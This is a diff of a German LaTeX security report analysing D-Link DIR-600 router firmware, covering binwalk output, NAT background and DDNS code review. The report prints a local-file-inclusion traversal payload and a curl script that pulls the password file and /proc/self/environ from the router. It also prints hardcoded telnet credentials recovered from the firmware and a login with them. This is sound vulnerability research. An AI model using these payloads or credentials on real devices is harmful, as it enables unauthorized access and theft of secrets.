@@ -389,9 +389,9 @@
 	%--------------------------------------------------------------------------------%
 	%-----------Nochmal überarbeiten----formulierung und rechtschreibung anpassen----%
 	Networke Address Translation(NAT) ist ein Mechanismus, bei dem der Router interne 
-	IP-Adressen eines lokalen Netztwerks (LAN) in eien öffentliche IP-Adresse übersetzt.
-	Es gibt welweit ca 4 Millarden public IPv4 Adressen, sie sind also begrenzt
-	Private Adressen werden nur innerhalb eines lokalen Netztwerks genutzt von den Geräten.
+	IP-Adressen eines lokalen Netztwerks (LAN) in eine öffentliche IP-Adresse übersetzt.
+	Es gibt welweit ungefähr 4 Millarden public IPv4 Adressen, sie sind durch ihre Architektur begrenzt.
+	Private Adressen werden lediglich innerhalb eines lokalen Netzwerks genutzt.
 	Haushalte oder Frimen haben alle eine private IP Adresse mit der sie mit dem Router verbunden sind.
 	Der Router wiederum hat eine public IP Adresse, und hat somit zugriff auf das Internet.
 	Über den Router können so alle Geräte auf das Internet zugreifen.
@@ -591,8 +591,7 @@
 	verwundbare version zurückgesetzt werden kann. Ohne diesen Schutz hätten Angreifer die Möglichkeit alte Firmware
 	mit bekannten Schwachstellen zu installieren.
 	Angriffe auf die Firmware stellen ein besonders Risiko dar, da sid unterhlab von firewall und Betriebssystem liegt 
-	und für den benutzt oftmals unichtbar zu erkenen ist.
-	%---Quelle(https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-193.pdf)---%
+	und für den benutzt oftmals unichtbar zu erkenen ist. \cite{regenscheid2018b}
 
 	\chapter{Tests D-Link DIR-600}
 	\label{sec:Tests D-Link DIR-600}
@@ -629,6 +628,13 @@
 	\label{sec:Architektur des Routers}
 	Der betrachtete Router ist von der Firma D-Link und gehört zu der DIR-600 Reihe.
 	Die Hardware Version ist Bx, wobei x für 1 oder 2 steht.
+
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=\textwidth]{img/Aufbau_Router.pdf}
+		\caption{Aufbau des Routers}
+		\label{fig:Aufbau Router}
+	\end{figure}
 	
 	Der Router folgt einer klassischen Embedded-System-Architektur mit klar getrennten Schichten.
 	Nach dem Start wird der Bootloader geladen. Er ist dafür zuständig die Hardware zu initialisieren, 
@@ -673,12 +679,12 @@
 	Ohne Transportverschlüsselung können Daten und Session-Inhalte passiv oder aktiv durch Man-in-the-Middle-Angriffe
 	mittgeschnitten oder manipuliert werden.
 
-	\begin{figure}[H]
-		\centering
-		\includegraphics[width=\textwidth]{img/Passwort_telnet.png}
-		\caption{Wireshark Filter: telnet}
-		\label{fig:Telnet Passwort}
-	\end{figure}
+\begin{figure}[H]
+	\centering
+	\includegraphics[width=\textwidth]{img/Passwort_telnet.png}
+	\caption{Wireshark Filter: telnet}
+	\label{fig:Telnet Passwort}
+\end{figure}
 	Auch die Verbindung über das Telnet Protokoll wird unverschlüsselt übertragen.
 	Die Authentifizierungsdaten sind klar nachvollziehbar und können leicht rekonstruiert werden. 
 	Telnet arbeitet zeichenbasiert, daher wird jedes Zeichen als eigenes Paket oder Teil eines Streams geschickt.
@@ -702,20 +708,24 @@
 	\label{sec:Firmware-Analyse}
 	Zur Analyse der Firmware wurde das Tool \texttt{binwalk} eingesetzt:
 
-	\begin{lstlisting}[basicstyle=\ttfamily]
+	\begin{lstlisting}[basicstyle=\ttfamily,
+		columns=fullflexible,
+    	keepspaces=true,
+    	breaklines=true
+		]
 	binwalk DIR600B_FW205b01.bin 
 	
-	DECIMAL       HEXADECIMAL     DESCRIPTION
+	DECIMAL     HEXADECIMAL  	DESCRIPTION
 	------------------------------------------------------------
-	48            0x30           Unix path: /dev/mtdblock/2
-	96            0x60           uImage header, header size: 64 bytes,
-									image size: 879555 bytes,
-									Data Address: 0x80000000,
-									Entry Point: 0x802B7000,
-									OS: Linux, CPU: MIPS,
-									compression type: lzma
-	160           0xA0           LZMA compressed data
-	917600        0xE0060        Squashfs filesystem
+	48          0x30        	Unix path: /dev/mtdblock/2
+	96          0x60           	uImage header, header size: 64 bytes,
+								image size: 879555 bytes,
+								Data Address: 0x80000000,
+								Entry Point: 0x802B7000,
+								OS: Linux, CPU: MIPS,
+								compression type: lzma
+	160         0xA0           	LZMA compressed data
+	917600      0xE0060        	Squashfs filesystem
 	\end{lstlisting}
 	
 	Der uImage Header enthält unter anderem Informationen zur CPU (MIPS), zur Ladeadresse im RAM sowie zum Einstiegspunkt
@@ -745,7 +755,7 @@
 	
 	In LZMA compressed data steht der eigentliche Kernel Code, komprimiert mit LZMA.
 	Dictionary size: 32MB bestimmt das Kompressionsfenster und ist typisch für Embedded Linux Kernel.
-	uncompressed size ~ 2.9MB ist die reale Kernelgröße nach dem Entpacken.
+	uncompressed size 2.9MB ist die reale Kernelgröße nach dem Entpacken.
 
 	PackImg section delimiter tag Das ist ein marker für den Beginn einer weiteren Firmware-Section. 
 
@@ -760,25 +770,26 @@
 	\label{sec:LFI-Schwachstelle}
 
 	Im Rahmen der Firmware-Analyse wurde im Verzeichniss \texttt{squashfs-root/www/} 
-	die Implementierung des Webinterface untersucht. Dabei konnte in der Datei 
+	die Implementierung des Webinterface untersucht. Dabei konnte in der Datei \newline
 	\texttt{squashfs-root/www/model/\_\_show\_info.php} eine sicherheitsrelevante Schwachstelle
 	identifiziert werden.
 	Die Datei fungiert als generischer Content-Renderer für das Webinterface. 
 	Sie ermöglicht unter anderem das dynamische Einbinden von Dateien.
 	Der relevante Codeabschnitt lautet:
-	\begin{lstlisting}[language=PHP]
-	if($REQUIRE_FILE!="")
-	{
-		require($LOCALE_PATH."/".$REQUIRE_FILE);
-	}
-	\end{lstlisting}
+\begin{lstlisting}[language=PHP]
+if($REQUIRE_FILE!="")
+{
+	require($LOCALE_PATH."/".$REQUIRE_FILE);
+}
+\end{lstlisting}
 
-	Hierbei wird der Parameter \texttt{REQUIRE_FILE} ohne Validierung in einen Dateipfad eingebunden
+	Hierbei wird der Parameter \texttt{REQUIRE\_FILE} ohne Validierung in einen Dateipfad eingebunden
 	und anschließend mittels \texttt{require()} eingebunden. Da dieser Parameter direkt durch den
 	Benutzer kontrolliert werden kann, entsteht eine Local File Inclusion (LFI)-Schwachstelle.
 	Durch das Verwenden von Directory Traversal Sequenzen, also der unautorisierte Zugriff auf Dateien 
 	mittels Pfadangaben in der URL, können unter anderem sensible Daten eingesehen werden.
-	Beispielsweise folgende Anfrage: \texttt{/www/locale/en\_US/ + ../../../../var/etc/httpasswd}.
+	Beispielsweise folgende Anfrage: \newline
+	\texttt{/www/locale/en\_US/ + ../../../../var/etc/httpasswd}. \newline
 	PHP löst das dann zu /var/etc/httpasswd auf, die Datei wird eingebunden und der Inhalt auf der Webseite sichtbar.
 	\begin{figure}[H]
 		\centering
@@ -794,54 +805,54 @@
 
 	Automatisierte Analyse
 	Ein automatisiertes Testskript wurde verwendet um verschiedene Dateisysteme abzurufen.
-	\begin{lstlisting}[language=bash]
-	#!/bin/bash
+\begin{lstlisting}[language=bash]
+#!/bin/bash
 
-	if [ $# -ne 1 ]; then
-		echo " Error: No IP-Adress"
-		exit
-	fi
-
-	IP_ADR=$1
-
-	FILES=(
-		"/var/etc/httpasswd"
-		"/var/log/messages"
-		"/proc/self/cmdline"
-		"/proc/self/environ"
-		"/proc/mounts"
-		"/proc/version"
-		"/proc/cpuinfo"
-		"/etc/hosts"
-	)
-
-	test_file() {
-	echo "------------------------------------"
-	echo "Test: $1"
-	echo "------------------------------------"
-	local encode
-	encode=$(printf "%s" "$1" | jq -sRr @uri)
-
-	curl -s "http://${IP_ADR}/model/__show_info.php?REQUIRE_FILE=${encode}" \
-		-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
-		-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
-		-H 'Accept-Language: en-US,en;q=0.5' \
-		-H 'Accept-Encoding: gzip, deflate' \
-		-H 'Connection: keep-alive' \
-		-H 'Upgrade-Insecure-Requests: 1' \
-		-H 'Priority: u=0, i' \
-	| sed -e 's/<!--.*-->//g' \
-			-e 's/<[^>]*>//g' \
-			-e 's/&nbsp;//g' \
-			-e '/^\s*$/d'
-	}
-
-	for file in "${FILES[@]}"; do
-	test_file "$file"
-	done
-
+if [ $# -ne 1 ]; then
+	echo " Error: No IP-Adress"
 	exit
-	\end{lstlisting}
+fi
+
+IP_ADR=$1
+
+FILES=(
+	"/var/etc/httpasswd"
+	"/var/log/messages"
+	"/proc/self/cmdline"
+	"/proc/self/environ"
+	"/proc/mounts"
+	"/proc/version"
+	"/proc/cpuinfo"
+	"/etc/hosts"
+)
+
+test_file() {
+echo "------------------------------------"
+echo "Test: $1"
+echo "------------------------------------"
+local encode
+encode=$(printf "%s" "$1" | jq -sRr @uri)
+
+curl -s "http://${IP_ADR}/model/__show_info.php?REQUIRE_FILE=${encode}" \
+	-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
+	-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
+	-H 'Accept-Language: en-US,en;q=0.5' \
+	-H 'Accept-Encoding: gzip, deflate' \
+	-H 'Connection: keep-alive' \
+	-H 'Upgrade-Insecure-Requests: 1' \
+	-H 'Priority: u=0, i' \
+| sed -e 's/<!--.*-->//g' \
+		-e 's/<[^>]*>//g' \
+		-e 's/&nbsp;//g' \
+		-e '/^\s*$/d'
+}
+
+for file in "${FILES[@]}"; do
+test_file "$file"
+done
+
+exit
+\end{lstlisting}
 	Das Skript arbeitet die einzelnen Pfade nacheinander ab. Der Befehl curl überträgt Daten zwischen dem Rechner
 	und einem Server. Mit -H lassen sich HTTP-Header setzen. Zudem wurde das Paket $jq$ installiert, so kann die Eingabe automatisch
 	entsprechend der URL-Vorgaben formatiert werden. \cite{pathtraversalowasp, reschke2015, wstgstableowasp}
@@ -891,45 +902,50 @@
 	Der Austausch erfolgt über eine TCP Verbindung. Bei Routern dient Telnet als Remote-Management-Protokoll
 	und gibt dem Benutzer eine Kommandozeile auf dem Gerät.
 	Mit folgendem Befehl ist es möglich herauszufinden ob der Router eine Telnet Schnittstelle besitzt.
-	\begin{lstlisting}
-	nc -zv 192.168.0.1 23
-	Connection to 192.168.0.1 23 port [tcp/telnet] succeeded!
-	\end{lstlisting}
+\begin{lstlisting}[basicstyle=\ttfamily]
+nc -zv 192.168.0.1 23
+Connection to 192.168.0.1 23 port [tcp/telnet] succeeded!
+\end{lstlisting}
 	
-	Technische Analyse
 	Der D-Link DIR 600 besitzt eine Telnet-Schnittstelle, welche durch einen Nutzter und ein Passwort
 	geschützt sind. Unter einem Embedded Linux ist der Standardnutzer in diesem Fall \texttt{Alphanetworks}.
 	Dies lässt sich durch eine kurze Recherche über das Internet herausfinden. Das Standardpasswort des Routers unterscheidet sich
 	nach Modell. Um das Passwort der Telnet-Schnittstelle herauszufinden, wurden die Firmware des Routers
 	erneut analysiert.
 	\texttt{grep -r "Alphanetworks"}
-	\texttt{squashfs-root/etc/scripts/misc/telnetd\.sh: telnetd -l "/usr/sbin/login" -u Alphanetworks:\$image_sign -i \$lf &}
+\begin{lstlisting}[basicstyle=\ttfamily]
+squashfs-root/etc/scripts/misc/telnetd\.sh: \
+telnetd -l "/usr/sbin/login" -u Alphanetworks:\$image\_sign -i \$lf &}
+\end{lstlisting}
 	Mit dem grep Befehl wurde die Firmware nach dem Standartnutzer rekursiv durchsucht.
-	Das Ergebnis zeigt den Benutzer und das Passwort, welches in \texttt{\$image_sign} gespeichert wird.
-	\texttt{grep -r "image_sign" squashfs-root/}
-	\texttt{squashfs-root/etc/scripts/misc/telnetd\.sh:image\_sign=`cat /etc/config/image_sign`}
+	Das Ergebnis zeigt den Benutzer und das Passwort, welches in \texttt{\$image\_sign} gespeichert wird.
+	\texttt{grep -r "image\_sign" squashfs-root/}
+\begin{lstlisting}
+squashfs-root/etc/scripts/misc/telnetd\.sh:
+image\_sign=`cat /etc/config/image\_sign`
+\end{lstlisting}
 	Die Ausgabe zeigt unter anderem diese Zeile, welche den Pfad zu dem Passwort enthält.
 	\texttt{cat squashfs-root/etc/config/image\_sign}
 	\texttt{wrgn23\_dlwbr\_dir600b}
-	Der \texttt{cat-Befehl} liefert das Passwort.
-	\begin{lstlisting}
-	Trying 192.168.0.1...
-	Connected to 192.168.0.1.
-	Escape character is '^]'.
-	login: Alphanetworks
-	Password: wrgn23_dlwbr_dir600b
-	\end{lstlisting}
+Der \texttt{cat-Befehl} liefert das Passwort.
+\begin{lstlisting}[basicstyle=\ttfamily]
+Trying 192.168.0.1...
+Connected to 192.168.0.1.
+Escape character is '^]'.
+login: Alphanetworks
+Password: wrgn23\_dlwbr\_dir600b
+\end{lstlisting}
 	Eine erfolgreiche Anmeldung bestätigt die Gültigkeit dieser Zugangsdaten.
 	
 	Nach erfolgreicher Anmeldung erhält der Benutzer Zugriff auf eine Shell-Umgebung, die durch \texttt{Busybox}, 
 	bereitstellt wird. BusyBox ist eine Sammlung von Unix-Werkzeugen, die unter anderem eine Shell bereitstellen. 
 	Der Befehl \texttt{mount} zeigt folgendes:
-	\begin{lstlisting}[basicstyle=\ttfamily]
-	/dev/root on / type squashfs (ro)
-	none on /proc type proc (rw)
-	sysfs on /sys type sysfs (rw)
-	ramfs on /var type ramfs (rw)
-	\end{lstlisting}
+\begin{lstlisting}[basicstyle=\ttfamily]
+/dev/root on / type squashfs (ro)
+none on /proc type proc (rw)
+sysfs on /sys type sysfs (rw)
+ramfs on /var type ramfs (rw)
+\end{lstlisting}
 	Durch die Ausgabe wird deutlich, das es sich um eine Read-Only-Firmware mit einem Eingebetteten Linux Design handelt.
 	Lediglich der RAM ist beschreibbar, jedoch sind die Daten dort nur während der Laufzeit verfügbar und verschwinden nach einem Reboot.
 	Dort werden typischerweise Logs, temporäre Dateien und Runtime-Konfigurationen gespeichert.
@@ -983,29 +999,29 @@
 	Konfigurationsdaten werden über den Dienst \texttt{xmldbc} verwaltet, eine XML-Datenbank.
 	Das Dynamic Domain Name System auch DDNS genannt, ist hier nicht als externe Bibliothek implementiert, sondern als separates Binärprogramm.
 	Die DDNS-Funktionalität wird über dynamisch generierte Shell-Skripte gestartet.
-	\begin{lstlisting}[language=PHP]
-		# dyndns.sh
-		rgdb -A $TROOT/misc/dyndns_run.php -V generate_start=$START > /var/run/dyndns.sh
-		sh /var/run/dyndns.sh > /dev/console
-	\end{lstlisting}
+\begin{lstlisting}[language=PHP]
+# dyndns.sh
+rgdb -A $TROOT/misc/dyndns_run.php -V generate_start=$START > /var/run/dyndns.sh
+sh /var/run/dyndns.sh > /dev/console
+\end{lstlisting}
 	Die eigentliche Logik wird dabei durch ein PHP-Template dynamisch, also während der Laufzeit erzeugt.
 	Dieses Template entscheidet aufgrund von Konfigurationswerten aus der Router-Datenbank, ob und welcher DDNS-Client
 	gestartet wird.
 	
 	Die eigentliche Befehlslogik wird dabei dynamisch erzeugt:
-	\begin{lstlisting}[language=PHP]
-	if ($USER!="" && $PASS!="")
-	{
-		echo "echo Start dyndns #".$provider."... > /dev/console\n";
-		echo "echo dyndns > ".$progfile."\n";
-		echo "dyndns -S \"".$provider;
-		echo "\" -u \"".$USER."\" -p \"".$PASS."\" -i ".$IPADDR." -t ".$TIME;
-		echo " -o /var/run/dyndns.html -d \"".$vendor." ".$model."\"";
-		echo " -q \"/var/run/dyndns.info\"";
-		if ($HOST!="") { echo " -n \"".$HOST."\""; }
-		echo " > /dev/console &\n";
-	}
-	\end{lstlisting}
+\begin{lstlisting}[language=PHP]
+if ($USER!="" && $PASS!="")
+{
+	echo "echo Start dyndns #".$provider."... > /dev/console\n";
+	echo "echo dyndns > ".$progfile."\n";
+	echo "dyndns -S \"".$provider;
+	echo "\" -u \"".$USER."\" -p \"".$PASS."\" -i ".$IPADDR." -t ".$TIME;
+	echo " -o /var/run/dyndns.html -d \"".$vendor." ".$model."\"";
+	echo " -q \"/var/run/dyndns.info\"";
+	if ($HOST!="") { echo " -n \"".$HOST."\""; }
+	echo " > /dev/console &\n";
+}
+\end{lstlisting}
 	Hierbei wird zur Laufzeit ein Systembefehl generiert und ausgeführt.
 	Es zeigt sich, dass sämtliche Parameter, einschließlich Benutzername, Passwort, Hostname und IP-Adresse,
 	direkt aus der Konfigurationsdatenbank übernommen werden. Eine zusätzliche Validierung
@@ -1014,16 +1030,16 @@
 
 	Die Analyse des Binärprogramms \texttt{/usr/bin/dyndns} wurde mithilfe von Ghidra genauer analysiert 
 	Es zeigt, dass die Kommandozeilenargumente direkt verarbeitet werden:
-	\begin{lstlisting}[language=c]
-	case 0x6e:  // -n
-		pcRam1000027c = optarg;   // hostname
-	case 0x70:  // -p
-		DAT_10000288 = optarg;    // password
-	case 0x69:  // -i
-		DAT_10000280 = optarg;    // IP address
-	case 0x53: // -S
-		DAT_10000274 = atoi(optarg);  // provider ID
-	\end{lstlisting}
+\begin{lstlisting}[language=c]
+case 0x6e:  // -n
+	pcRam1000027c = optarg;   // hostname
+case 0x70:  // -p
+	DAT_10000288 = optarg;    // password
+case 0x69:  // -i
+	DAT_10000280 = optarg;    // IP address
+case 0x53: // -S
+	DAT_10000274 = atoi(optarg);  // provider ID
+\end{lstlisting}
 	
 	Anschließend wird anhand einer Service-ID entschieden, welcher DDNS-Anbieter
 	verwendet wird. Hierfür wird eine intern Tabelle verwendet, welche Service-Namen numerische Identifikation zuordnet.
@@ -1031,13 +1047,13 @@
 
 	Nach der Konfigurationsphase folgt die Netzwerklogik.
 	Das Programm arbeitet mit zustandbasierter Logik über \texttt{select()}:
-	\begin{lstlisting}[language=c]
-	iVar2 = select(uVar7 + 1,
-			(fd_set *)local_288,
-			(fd_set *)__writefds,
-			(fd_set *)0x0,
-			&local_290);
-	\end{lstlisting}
+\begin{lstlisting}[language=c]
+iVar2 = select(uVar7 + 1,
+		(fd_set *)local_288,
+		(fd_set *)__writefds,
+		(fd_set *)0x0,
+		&local_290);
+\end{lstlisting}
 	Interpretation der Zustände:
 	0 = disconnected
 	1 = connecting
@@ -1049,18 +1065,18 @@
 	Die Auswahl des DDNS-Anbieters bestimmt dabei den Aufbau der HTTP-Anfrage. 
 	Die Firmware unterstützt mehrere Anbieter beispielsweise DynDNS, No-IP, wobei jeder Anbieter ein spezifisches Anfrageformat verwendet. 
 	Beispiel DynDNS.org
-	\begin{lstlisting}[language=c]
-	snprintf(acStack_260,500,
-		"GET /nic/update?&hostname=%s&ip=%s HTTP/1.0\r\n
-			Authorization: Basic %s\r\n
-			User-Agent: %s\r\n
-			Host: %s\r\n\r\n",
-			uRam1000027c,puVar2,uVar1,DAT_10000294,DAT_10000278);
-	\end{lstlisting}
+\begin{lstlisting}[language=c]
+snprintf(acStack_260,500,
+	"GET /nic/update?&hostname=%s&ip=%s HTTP/1.0\r\n
+		Authorization: Basic %s\r\n
+		User-Agent: %s\r\n
+		Host: %s\r\n\r\n",
+		uRam1000027c,puVar2,uVar1,DAT_10000294,DAT_10000278);
+\end{lstlisting}
 	Die HTTP-Requests werden manuell zusammengesetzt und direkt über eine Socket-Verbindung versendet.
 	Zusätzlich wird in den meisten Fällen eine Basis-Authentifizierung, bestehend aus Benutzername und Passwort
 	verlangt, welche Base64 codiert in den HTTP-Header integriert werden (siehe oben).
-	\texttt{base64encode(pcVar4,sVar3,&uStack_28);}
+	\texttt{base64encode(pcVar4,sVar3,&uStack_28)}
 
 	Die Implementierung weist einige sicherheitskritische Schwächen auf, die für ältere Embedded-Systeme typisch sind.
 	Insbesondere der Verzicht auf eine verschlüsselte Kommunikation stellt ein potenzielles Risiko dar. 
@@ -1069,7 +1085,8 @@
 
 	Zudem werden sensible Daten im Speicher verarbeitet. Authentifizierungsinformationen werden global abgelegt und mehrfach
 	in unterschiedlichen Verarbeitungsschritten verwendet. Auch wenn keine direkten Schwachstellen im 
-	untersuchten Codeabschnitt sichtbar sind, bleibt durch die unsauberen Datenflüsse und die fehlende strikte Validierung ein erhöhtes Sicherheitsrisiko.
+	untersuchten Codeabschnitt sichtbar sind, bleibt durch die unsauberen Datenflüsse und die 
+	fehlende strikte Validierung ein erhöhtes Sicherheitsrisiko. \cite{thomas2021, thomas2021}
 
 	\subsection{Bewertung:}
 	\label{sec:Bewertung-DDNS}
